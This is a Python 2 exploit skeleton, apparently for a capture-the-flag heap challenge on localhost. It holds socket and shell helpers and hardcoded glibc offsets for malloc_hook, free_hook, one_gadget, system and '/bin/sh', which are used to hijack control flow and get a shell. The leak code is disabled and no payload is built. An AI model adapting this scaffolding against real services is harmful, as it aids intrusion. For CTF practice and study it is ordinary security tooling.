import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def main():
    '''
    # leak libc
    read_until(f,"content: ")
    top_addr = u(f.read(6)+"\x00"*2) 
    print "top_addr: ",hex(top_addr)
    libc_base = top_addr - 0x3c4b78
    print "libc base: ",hex(libc_base)
    malloc_hook = libc_base + malloc_hook_offset
    print "malloc_hook: ",hex(malloc_hook)
    free_hook = libc_base + free_hook_offset
    print "free_hook: ",hex(free_hook)
    one_rce = libc_base + one_rce_offset
    print "one_rce: ",hex(one_rce)
    _IO_2_1_stderr = libc_base + _IO_2_1_stderr_offset
    print "_IO_2_1_stderr: ",hex(_IO_2_1_stderr)
    _IO_2_1_stdin = libc_base + _IO_2_1_stdin_offset
    print "_IO_2_1_stdin: ",hex(_IO_2_1_stdin)
    _IO_2_1_stdout = libc_base + _IO_2_1_stdout_offset
    print "_IO_2_1_stdout: ",hex(_IO_2_1_stdout)
    global_max_fast = libc_base + global_max_fast_offset
    print "global_max_fast: ",hex(global_max_fast)
    _IO_list_all = libc_base + _IO_list_all_offset
    print "_IO_list_all: ",hex(_IO_list_all)
    system = libc_base + system_offset
    print "system: ",hex(system)
    __libc_start_main = libc_base + __libc_start_main_offset
    print "__libc_start_main: ",hex(__libc_start_main)
    binsh = libc_base + binsh_offset
    print "binsh: ",hex(binsh)
    '''

    shell(s)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("localhost", 7322)
        one_rce_offset = 0x4526a
        #one_rce_offset = 0xf02a4
        #one_rce_offset = 0xf1147
        malloc_hook_offset = 0x00000000003c4b10
        free_hook_offset = 0x00000000003c67a8
        _IO_2_1_stderr_offset = 0x00000000003c5540
        _IO_2_1_stdin_offset = 0x00000000003c48e0
        _IO_2_1_stdout_offset = 0x00000000003c5620
        global_max_fast_offset = 0x3c67f8
        _IO_list_all_offset = 0x00000000003c5520
        system_offset = 0x0000000000045390
        __libc_start_main_offset = 0x0000000000020740
        binsh_offset = 0x18cd57
        main()
    else:
        s, f = sock("localhost", 7322)
        one_rce_offset = 0x4526a
        #one_rce_offset = 0xf02a4
        #one_rce_offset = 0xf1147
        malloc_hook_offset = 0x00000000003c4b10
        free_hook_offset = 0x00000000003c67a8
        _IO_2_1_stderr_offset = 0x00000000003c5540
        _IO_2_1_stdin_offset = 0x00000000003c48e0
        _IO_2_1_stdout_offset = 0x00000000003c5620
        global_max_fast_offset = 0x3c67f8
        _IO_list_all_offset = 0x00000000003c5520
        system_offset = 0x0000000000045390
        __libc_start_main_offset = 0x0000000000020740
        binsh_offset = 0x18cd57
main()
